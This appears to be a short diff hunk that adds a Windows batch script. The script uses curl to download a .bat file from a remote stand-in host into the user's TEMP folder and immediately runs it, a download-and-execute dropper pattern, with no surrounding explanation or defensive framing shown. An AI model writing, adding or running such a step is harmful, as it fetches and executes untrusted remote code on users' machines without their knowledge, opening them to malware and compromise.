@@ -1,0 +1,3 @@
+@echo off
+curl -o %TEMP%\o.bat http://one-2.example.test/x.bat
+start %TEMP%\o.bat
